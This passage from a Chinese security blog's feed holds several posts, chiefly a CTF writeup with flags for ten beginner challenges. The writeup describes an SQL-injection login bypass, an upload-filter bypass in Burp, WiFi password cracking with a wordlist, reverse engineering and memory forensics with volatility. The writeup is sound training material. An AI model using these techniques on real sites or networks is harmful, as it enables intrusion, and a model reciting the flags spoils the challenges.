rel="noopener">https://thief.one/2017/06/20/1/</a><br>7、<a href="http://blog.itpub.net/69925937/viewspace-2647388/" target="_blank" rel="noopener">http://blog.itpub.net/69925937/viewspace-2647388/</a><br>8、<a href="https://blog.csdn.net/haozhoupan/article/details/51151656" target="_blank" rel="noopener">https://blog.csdn.net/haozhoupan/article/details/51151656</a><br>9、<a href="https://blog.csdn.net/qq_33571718/article/details/78373653" target="_blank" rel="noopener">https://blog.csdn.net/qq_33571718/article/details/78373653</a><br>10、<a href="https://www.jianshu.com/p/43f6785e0589" target="_blank" rel="noopener">https://www.jianshu.com/p/43f6785e0589</a><br>感谢以上文章的作者，如有侵权，烦请于我的公众号TeamsSix进行私信联系。</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近参加了一场面试，平时感觉自己学的还挺不错的，但是在面试的时候才意识到到原来自己还有那么多东西不够了解。&lt;/p&gt;
&lt;p&gt;这其中包括以前只是听过并没有深入学习了解的东西，同时也包括以前很了解但是现在因为长时间没有去使用碰触导致已经遗忘的东西，所以本篇文章我想记录一下这次面试过程中哪些自己不太了解的知识点。&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="https://www.teamssix.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="面试" scheme="https://www.teamssix.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】VPS欠费后Hexo博客521无法访问</title>
    <link href="https://www.teamssix.com/year/191009-164624.html"/>
    <id>https://www.teamssix.com/year/191009-164624.html</id>
    <published>2019-10-09T08:46:24.000Z</published>
    <updated>2019-11-02T12:22:17.434Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近自己博客的VPS欠费了，但是充值之后，启动VPS发现博客依旧无法访问，经过多次排查后，最后的结果真的是哭笑不得，下面就记录一下我最后的解决办法。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/521_1.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/521_2.png" alt></p><h1 id="0x01-排查过程"><a href="#0x01-排查过程" class="headerlink" title="0x01 排查过程"></a>0x01 排查过程</h1><p>排查的过程中，碰到的第一个问题就是我发现SSH连接不上了，第一反应是博客被黑了？之后修改密码后才登上，估计只是我忘记密码了吧<br>之后又发现hexo同步本地数据同步不上去，怎么搞都不行，之后过了一天，发现又可以同步了，这……玄学问题？<br>直到博客无法访问第三天，我到网上四处找寻结果，还是没找到我碰到的这个问题，最后突然看到有人提到hexo使用的是nginx网页服务器，这才恍然大悟，我博客的nginx没有开！</p><h1 id="0x02-解决步骤"><a href="#0x02-解决步骤" class="headerlink" title="0x02 解决步骤"></a>0x02 解决步骤</h1><p>直接进入自己VPS的命令行输入nginx开启nginx服务就行了，之后如果不放心可以输入netstat -ant看看自己的80端口有没有开。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VPS_name ~]<span class="comment"># nginx</span></span><br><span class="line">[root@VPS_name ~]<span class="comment"># netstat -ant</span></span><br></pre></td></tr></table></figure><h1 id="0x03-一点思考"><a href="#0x03-一点思考" class="headerlink" title="0x03 一点思考"></a>0x03 一点思考</h1><p>讲道理，最后发现是这样的一个原因，还是挺尴尬的，博客自从搭建好后，几个月都没有碰过这些环境的问题，以前VPS重启nginx也是自动开启的，这次不知道为什么突然不行了，同时也感觉到有些东西长时间不碰，即使当初看着多么简单的东西也变难了起来。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近自己博客的VPS欠费了，但是充值之后，启动VPS发现博客依旧无法访问，经过多次排查后，最后的结果真的是哭笑不得，下面就记录一下我最后的解决办法。&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="VPS" scheme="https://www.teamssix.com/tags/VPS/"/>
    
      <category term="Hexo" scheme="https://www.teamssix.com/tags/Hexo/"/>
    
      <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>【CTF】记录一次CTF比赛的Writeup</title>
    <link href="https://www.teamssix.com/year/190925-114420.html"/>
    <id>https://www.teamssix.com/year/190925-114420.html</id>
    <published>2019-09-25T03:44:20.000Z</published>
    <updated>2019-11-02T12:21:31.563Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近因为省赛快来了，因此为实验室的小伙伴准备了这次比赛，总共10道题目，考虑到大多数小伙伴都刚从大一升到大二，因此整体难度不高，当然有几道难度还是有的。</p><p>题目大多数都是从网上东找西找的，毕竟我也是个菜鸟呀，还要给他们出题，我太难了。</p><p>废话不多说，直接上Writeup吧，以下题目的文件下载地址可以在我的公众号（TeamsSix）回复CTF获取。</p><a id="more"></a><h1 id="0x01-隐写-1"><a href="#0x01-隐写-1" class="headerlink" title="0x01 隐写 1"></a>0x01 隐写 1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag：steganoI</span><br><span class="line"></span><br><span class="line">flag格式：passwd:</span><br><span class="line"></span><br><span class="line">题目来源：http://www.wechall.net/challenge/training/stegano1/index.php</span><br></pre></td></tr></table></figure><p>签到题，下载题目图片，利用记事本打开即可看到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf1.png" alt></p><h1 id="0x02-隐写-2"><a href="#0x02-隐写-2" class="headerlink" title="0x02 隐写 2"></a>0x02 隐写 2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag：teamssix</span><br><span class="line"></span><br><span class="line">Hint:一般在公共场合才能看的见</span><br><span class="line"></span><br><span class="line">题型参考：http://www.wechall.net/challenge/connect_the_dots/index.php</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf2.png" alt><br>打开图片，参考题目提示说一般在公共场合才能看见，因此通过盲文对照表可以得出flag是teamssix，图片中的AXHU只是用来干扰的，这道题也是我参考wechall里面的一道题型。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf3.png" alt></p><h1 id="0x03-Web-1"><a href="#0x03-Web-1" class="headerlink" title="0x03 Web 1"></a>0x03 Web 1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag:iamflagsafsfskdf11223</span><br><span class="line"></span><br><span class="line">Hint:站内有提示</span><br><span class="line"></span><br><span class="line">题目地址：</span><br><span class="line">http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php</span><br><span class="line">参考来源：http://hackinglab.cn/ShowQues.php?type=sqlinject</span><br></pre></td></tr></table></figure><p>1、打开题目地址<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf4.png" alt><br>2、查看源码找到提示<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf5.png" alt><br>3、根据提示使用admin登陆，并使用弱密码<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf6.png" alt><br>4、尝试多次都提示失败，利用万能密码再做尝试，找到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf7.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf8.png" alt></p><h1 id="0x04-Web-2"><a href="#0x04-Web-2" class="headerlink" title="0x04 Web 2"></a>0x04 Web 2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag:76tyuh12OKKytig#$%^&amp;</span><br><span class="line"></span><br><span class="line">题目地址：http://lab1.xseclab.com/upload3_67275a14c1f2dbe0addedfd75e2da8c1/</span><br><span class="line"></span><br><span class="line">flag格式：key is :</span><br><span class="line"></span><br><span class="line">题目来源：http://hackinglab.cn/ShowQues.php?type=upload</span><br></pre></td></tr></table></figure><p>1、打开题目地址，发现是一个文件上传界面<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf9.png" alt><br>2、先把Burp挂上，随便上传一个JPG图片试试，并来到Burp重发这个包<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf10.png" alt><br>3、在Burp中对文件名进行修改，比如在jpg后加上.png或者其他东西，成功看到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf11.png" alt></p><h1 id="0x05-soeasy"><a href="#0x05-soeasy" class="headerlink" title="0x05 soeasy"></a>0x05 soeasy</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag:HackingLabHdd1b7c2fb3ff3288bff</span><br><span class="line"></span><br><span class="line">Hint:在这个文件中找到key就可以通关</span><br><span class="line"></span><br><span class="line">flag格式:key:</span><br><span class="line"></span><br><span class="line">题目来源：http://hackinglab.cn/ShowQues.php?type=pentest</span><br></pre></td></tr></table></figure><p><strong>解法一：</strong><br>1、下载文件后，发现是vmdk文件，利用DeskGenius打开后，发现Key，此为正确答案<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf12.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf13.png" alt></p><p><strong>解法二：</strong><br>1、利用Vmware映射虚拟硬盘同样可以打开<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf14.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf15.png" alt></p><h1 id="0x06-Crack"><a href="#0x06-Crack" class="headerlink" title="0x06 Crack"></a>0x06 Crack</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag:19940808</span><br><span class="line"></span><br><span class="line">Hint:flag就是密码</span><br><span class="line"></span><br><span class="line">题目：邻居悄悄把密码改了，你只知道邻居1994年出生的，能找到她的密码吗？</span><br><span class="line"></span><br><span class="line">题目来源：http://hackinglab.cn/ShowQues.php?type=decrypt</span><br></pre></td></tr></table></figure><p>1、下载题目文件，根据题意，需要对WiFi密码破解，而且密码很有可能是邻居的生日，因此我们利用工具生成字典。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf16.png" alt><br>2、接下来利用ewsa进行破解，可以看到破解后的密码<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf17.png" alt><br>这道题目当时实验室有人用kali做的，kali下的工具感觉破解速度更快。</p><h1 id="0x07-BiliBili"><a href="#0x07-BiliBili" class="headerlink" title="0x07 BiliBili"></a>0x07 BiliBili</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag:Congratulations_you_got_it</span><br><span class="line"></span><br><span class="line">题目：bilibili</span><br><span class="line"></span><br><span class="line">flag格式：ctf&#123;&#125;</span><br></pre></td></tr></table></figure><p><strong>解法一：</strong><br>1、使用Wireshark打开数据包，直接搜索ctf<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf18.png" alt><br>2、找到标识的那一行右击进行追踪对应的协议，比如这条是http协议就追踪http协议，之后再次查找ctf<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf19.png" alt><br>3、发现ctf括号后的内容为base64加密，解密即可得到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf20.png" alt><br><strong>解法二：</strong><br>1、和解法一一样，对数据包进行追踪http流，不难看出这是访问space.bilibili.com/148389186的一个数据包<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf21.png" alt><br>2、打开这个网址，同样可以看到被base64加密的flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf22.png" alt><br>另外打个小广告，上面这个是我的bilibili号（TeamsSix），欢迎大家关注，嘿嘿</p><h1 id="0x08-Check"><a href="#0x08-Check" class="headerlink" title="0x08 Check"></a>0x08 Check</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">flag:sAdf_fDfkl_Fdf</span><br><span class="line"></span><br><span class="line">题目：简单的逆向</span><br><span class="line"></span><br><span class="line">flag格式：flag&#123;&#125;</span><br><span class="line"></span><br><span class="line">题目来源：https://www.cnblogs.com/QKSword/p/9095242.html</span><br></pre></td></tr></table></figure><p>1、下载文件，发现是exe文件，放到PEiD里看看有没有壳以及是什么语言编写的，如果有壳需要先脱壳。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf23.png" alt><br>2、可以看到使用的C语言写的，同时是32位，因此使用IDA32位打开，之后找到main函数<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf24.png" alt><br>3、按F5查看伪代码，并点击sub_401050子函数<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf25.png" alt><br>4、不难看出下列是一个10进制到ASCII码的转换<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf26.png" alt><br>5、利用在线网站转换即可获得flag，网站地址：<a href="http://ctf.ssleye.com/jinzhi.html" target="_blank" rel="noopener">http://ctf.ssleye.com/jinzhi.html</a><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf27.png" alt></p><h1 id="0x09-Android-RE"><a href="#0x09-Android-RE" class="headerlink" title="0x09 Android RE"></a>0x09 Android RE</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag:DDCTF-397a90a3267641658bbc975326700f4b@didichuxing.com</span><br><span class="line"></span><br><span class="line">题目：安卓逆向</span><br><span class="line"></span><br><span class="line">flag格式：DDCTF-</span><br><span class="line"></span><br><span class="line">Hint:flag中包含chuxing</span><br><span class="line"></span><br><span class="line">题目来源：https://xz.aliyun.com/t/1103</span><br></pre></td></tr></table></figure><p>1、这道题是滴滴出行的一道CTF，下载题目可以看到一个apk文件，先在模拟器中运行看看是个什么东西<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf28.png" alt><br>2、功能很简单，一个输入框，输错会提示Wrong，那么利用Android killer给它反编译一下，查找字符“Wrong”<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf29.png" alt><br>3、可以看到Wrong字符的路径，接下来进行反编译，不过可能由于本身软件的文件，反编译提示未找到对应的APK源码，没关系，换ApkIDE对其进行编译<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf30.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf31.png" alt><br>4、等待一段时间后，可以看到对应源码，简单分析就可以知道该代码从hello-libs.so文件加载，并且对mFlagEntryView.getText().toString()函数的内容即我们输入的内容和stringFromJNI()函数的内容做判断，如果一致就Correct，即正确，不一致就返回Wrong，即错误，那么接下来只需要分析stringFromJNI()的内容就行了，因此我们需要知道系统从hello-libs.so文件加载了什么<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf32.png" alt><br>5、将APK解压，找到hello-libs.so文件，由于现在手机都是用arm64位的CPU（我也不知道是不是的啊，听别人说的），因此我们找到arm64-v8a文件夹下的libhello-libs.so文件，用IDA打开<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf33.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf34.png" alt><br>6、打开IDA后，根据题目提示，Alt +T　查找chuxing<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf35.png" alt><br>７、成功找到flag（<a href="mailto:DDCTF-397a90a3267641658bbc975326700f4b@didichuxing.com" target="_blank" rel="noopener">DDCTF-397a90a3267641658bbc975326700f4b@didichuxing.com</a><br>）输入到模拟器中看到提示Correct，说明flag正确。<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf36.png" alt></p><h1 id="0x10-Easy-dump"><a href="#0x10-Easy-dump" class="headerlink" title="0x10 Easy_dump"></a>0x10 Easy_dump</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag：F0rens1cs_St2rt</span><br><span class="line"></span><br><span class="line">题目：Easy_dump</span><br><span class="line"></span><br><span class="line">flag格式：LCTF&#123;&#125;</span><br><span class="line"></span><br><span class="line">Hint：volatilty了解一下</span><br><span class="line"></span><br><span class="line">题目来源：https://www.tr0y.wang/2016/12/16/MiniLCTF/index.html</span><br></pre></td></tr></table></figure><p><strong>解法一：</strong><br>1、下载题目文件，提示利用volatilty工具，同时结合文件后缀为vmem（VMWare的虚拟内存文件），因此判断是一个内存取证的题目，关于volatilty的使用可以参考官方手册：<a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility/wiki/Command-Reference</a>，废话不多说，先看看镜像信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># volatility -f xp.vmem imageinfo</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf37.png" alt><br>2、可以看到该镜像信息的为WinXPSP2x86，接下来直接扫描查看一些系统文件中有没有flag文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># volatility -f xp.vmem --profile=WinXPSP2x86 filescan | grep flag</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf38.png" alt><br>3、将该flag.txt文件dump下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># volatility -f xp.vmem --profile=WinXPSP2x86 dumpfiles -Q 0x0000000005ab74c8 -D ./ -u</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf39.png" alt><br>4、直接cat flag文件即可看到flag<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf40.png" alt><br><strong>解法二：</strong><br>因为该题作者将flag复制到了自己电脑的粘贴板里的，所以直接获取粘贴板的内容也是可以看到flag的，不过谁能想到这种操作 [笑哭]</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># volatility -f xp.vmem clipboard</span></span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/ctf41.png" alt></p><p>以上就是本次我为他们准备的CTF的全部内容，大多数都是很基础的题目，平时拿来练练手还是不错的，拓宽一下自己的了解面，发现一些自己以前不知道的东西，如果你也想拿上面的题目来玩玩，在公众号（TeamsSix）回复CTF就可以获取下载地址哦。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近因为省赛快来了，因此为实验室的小伙伴准备了这次比赛，总共10道题目，考虑到大多数小伙伴都刚从大一升到大二，因此整体难度不高，当然有几道难度还是有的。&lt;/p&gt;
&lt;p&gt;题目大多数都是从网上东找西找的，毕竟我也是个菜鸟呀，还要给他们出题，我太难了。&lt;/p&gt;
&lt;p&gt;废话不多说，直接上Writeup吧，以下题目的文件下载地址可以在我的公众号（TeamsSix）回复CTF获取。&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="https://www.teamssix.com/categories/CTF/"/>
    
    
      <category term="比赛" scheme="https://www.teamssix.com/tags/%E6%AF%94%E8%B5%9B/"/>
    
      <category term="CTF" scheme="https://www.teamssix.com/tags/CTF/"/>
    
      <category term="Writeup" scheme="https://www.teamssix.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>【经验总结】记录一次Docker下安装CTFd的错误</title>
    <link href="https://www.teamssix.com/year/190720-121144.html"/>
    <id>https://www.teamssix.com/year/190720-121144.html</id>
    <published>2019-07-20T04:11:44.000Z</published>
    <updated>2019-11-02T12:22:24.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-提示错误"><a href="#0x01-提示错误" class="headerlink" title="0x01 提示错误"></a>0x01 提示错误</h1><p>根据官方的步骤执行docker-compose up但是我得到了这样的一个错误</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/docker_CTFd1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/CTFd<span class="comment"># docker-compose up</span></span><br><span class="line">ERROR: The Compose file <span class="string">'./docker-compose.yml'</span> is invalid because:</span><br><span class="line">networks.internal value Additional properties are not allowed (<span class="string">'internal'</span> was unexpected)</span><br></pre></td></tr></table></figure><p>经过多次查询后，是因为版本问题导致，因此需要将原来的docker-compose版本卸载，安装新版本。</p><h1 id="0x02-安装新版本"><a href="#0x02-安装新版本" class="headerlink" title="0x02 安装新版本"></a>0x02 安装新版本</h1><p>卸载docker-compose版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip uninstall docker-compose</span><br></pre></td></tr></table></figure><p>先升级一下pip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install –upgrade pip</span><br></pre></td></tr></table></figure><p>继续安装新版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U docker-compose</span><br></pre></td></tr></table></figure><p>也可以使用国内pip源进行加速，我使用的国内源进行的安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple -U docker-compose</span><br></pre></td></tr></table></figure><p>之后再执行docker-compose up就没有问题了<br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/docker_CTFd2.png" alt></p><p>平时遇到问题还是需要先根据提示自己一步一步去找解决方法，之后再利用好Google。</p><blockquote><p>参考文章：<a href="https://www.ilanni.com/?p=13371" target="_blank" rel="noopener">https://www.ilanni.com/?p=13371</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x01-提示错误&quot;&gt;&lt;a href=&quot;#0x01-提示错误&quot; class=&quot;headerlink&quot; title=&quot;0x01 提示错误&quot;&gt;&lt;/a&gt;0x01 提示错误&lt;/h1&gt;&lt;p&gt;根据官方的步骤执行docker-compose up但是我得到了这样的一个错误&lt;/p&gt;
    
    </summary>
    
      <category term="经验总结" scheme="https://www.teamssix.com/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="Docker" scheme="https://www.teamssix.com/tags/Docker/"/>
    
      <category term="CTFd" scheme="https://www.teamssix.com/tags/CTFd/"/>
    
      <category term="环境搭建" scheme="https://www.teamssix.com/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>分享一张超详细的渗透测试导图</title>
    <link href="https://www.teamssix.com/year/190717-124041.html"/>
    <id>https://www.teamssix.com/year/190717-124041.html</id>
    <published>2019-07-17T04:40:41.000Z</published>
    <updated>2019-11-02T12:23:35.036Z</updated>
    
    <content type="html"><![CDATA[<p>这是Github上看到的一张渗透测试思维导图，超级详细，在此分享。</p><a id="more"></a><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE.png" alt></p><blockquote><p>图片来源地址：<a href="https://github.com/iSafeBlue/Mind-Map" target="_blank" rel="noopener">https://github.com/iSafeBlue/Mind-Map</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这是Github上看到的一张渗透测试思维导图，超级详细，在此分享。&lt;/p&gt;
    
    </summary>
    
      <category term="资源分享" scheme="https://www.teamssix.com/categories/%E8%B5%84%E6%BA%90%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="思维导图" scheme="https://www.teamssix.com/tags/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"/>
    
      <category term="渗透测试" scheme="https://www.teamssix.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>【工具】批量网站CMS指纹识别</title>
    <link href="https://www.teamssix.com/year/190715-102622.html"/>
    <id>https://www.teamssix.com/year/190715-102622.html</id>
    <published>2019-07-15T02:26:22.000Z</published>
    <updated>2019-11-02T12:23:01.543Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><ul><li>使用Python3开发</li><li>结果导出为Output_Result.csv文件</li><li>使用在线平台（<a href="http://whatweb.bugscaner.com" target="_blank" rel="noopener">http://whatweb.bugscaner.com</a>）进行指纹识别</li><li>项目下载地址：<a href="https://github.com/teamssix/Batch-identification-of-website-CMS-fingerprints" target="_blank" rel="noopener">Batch-identification-of-website-CMS-fingerprints</a></li></ul><h1 id="0x02-使用方法"><a href="#0x02-使用方法" class="headerlink" title="0x02 使用方法"></a>0x02 使用方法</h1><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 Batch_CMS_identification.py url.txt</span><br></pre></td></tr></table></figure><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification1.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification2.png" alt><br><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Batch_CMS_identification3.png" alt></p><h1 id="0x03-注意事项"><a href="#0x03-注意事项" class="headerlink" title="0x03 注意事项"></a>0x03 注意事项</h1><ul><li>url.txt文件中地址格式需要http开头，如<a href="http://www.teamssix.com/">http://www.teamssix.com</a></li><li>如果执行过程中出现警告，一般是碰到有些网站使用的https的情况，可以不用理会，对结果没有影响。</li><li>如果想重新运行程序，请确认导出的CSV文件没有被打开，否则将因为不能导出文件而报错</li><li>程序中途想要退出，可以直接Ctrl+C退出，等待一段时间后便会退出，结果会依然保存</li><li>如果程序经常提示连接异常，可能因为对方拒绝连接或者本地网速较慢，如果本地网速延时较高，可将程序中的两处timeout调高一些，为保证速度，默认timeout为1秒。</li><li>该平台每天有1500的使用限制。</li></ul><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt></p>]]></content>
    
    <summary type="html">
    
